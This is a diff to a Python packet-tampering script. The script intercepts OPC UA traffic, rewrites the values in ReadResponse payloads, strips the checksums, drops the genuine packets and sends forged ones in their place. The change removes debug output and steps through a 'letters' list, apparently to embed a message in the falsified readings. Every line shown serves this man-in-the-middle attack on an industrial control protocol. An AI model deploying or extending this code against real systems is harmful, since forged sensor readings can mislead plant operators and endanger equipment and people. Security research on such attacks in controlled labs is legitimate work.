@@ -19,6 +19,7 @@ def alter_payload(opcua_data: OpcuaData):
     new_value_dec = struct.unpack('>d', bytes.fromhex(new_value_hex_be))[0]
     new_value_hex_le = str(hex(struct.unpack('L', struct.pack('>d', new_value_dec))[0])[2:].zfill(16))
     new_payload = opcua_data.payload[:opcua_data.start] + new_value_hex_le + opcua_data.payload[opcua_data.end:]
+    letters = letters[1:]
     return bytes.fromhex(new_payload)
 
 
@@ -28,7 +29,6 @@ def alter_and_drop(pkt):
     pl = IP(pkt.get_payload())
     if pl.haslayer("IP") and pl.haslayer("TCP"):
         opcua_data = extract_packet_data(pl)
-        print(opcua_data.__str__())
         if opcua_data.rsp_type == "ReadResponse" and len(letters) > 0:
             new_payload = alter_payload(opcua_data)
             pl[Raw].load = new_payload
@@ -37,7 +37,6 @@ def alter_and_drop(pkt):
             del pl[TCP].chksum
             del pl[IP].chksum
             pkt.drop()
-            pl.show2()
             send(pl, verbose=False)
         else:
             pkt.accept()
